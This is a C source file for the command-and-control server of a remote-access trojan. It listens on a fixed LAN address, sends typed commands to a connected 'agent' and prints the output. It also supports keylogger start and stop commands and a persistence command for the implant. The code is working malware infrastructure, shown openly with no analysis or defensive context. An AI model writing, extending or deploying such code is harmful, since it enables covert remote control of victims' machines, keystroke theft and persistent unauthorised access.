#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>

#define bzero(p, size) (void) memset((p), 0, (size))
#define SIZE 4096

char* str_cut(char str[], int slice_from, int slice_to){
    if(str[0] == '\0')
        return NULL;

    char *buffer;
    size_t str_len, buffer_len;

    if(slice_to < 0 && slice_from > slice_to){
        str_len = strlen(str);
        if (abs(slice_to) > str_len -1)
            return NULL;

        if (abs(slice_from) > str_len)
            slice_from = (-1) * str_len;

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);

    } else if (slice_from >= 0 && slice_to > slice_from){
        str_len = strlen(str);

        if (slice_from > str_len - 1)
            return NULL;
        buffer_len = slice_to - slice_from;
        str += slice_from;

    } else
        return NULL;

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}


int main(){
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int optval = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0){
        printf("Error Setting TCP Socket Options!\n");
        return 1;
    }
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.0.105");
    server_address.sin_port = htons(50005);

    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
    listen(sock, 5);
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

    while(1){
        jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));
        printf("* [Void]Agent#%s-$: ", inet_ntoa(client_address.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");
        write(client_socket, buffer, sizeof(buffer));
        if(strncmp("q", buffer, 1) == 0){
            break;
        }
        else if(strncmp("cd ", buffer, 3) == 0){
            goto jump;
        }
        else if(strncmp("keylog_start", buffer, 12) == 0){
            goto jump;
        }
        else if(strncmp("keylog_stop", buffer, 11) == 0){
            goto jump;   
        }   
        else if(strncmp("persist", buffer, 7) == 0){
            recv(client_socket, response, sizeof(response), 0);
            printf("%s", response);
        }
        else{
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }
    }
}
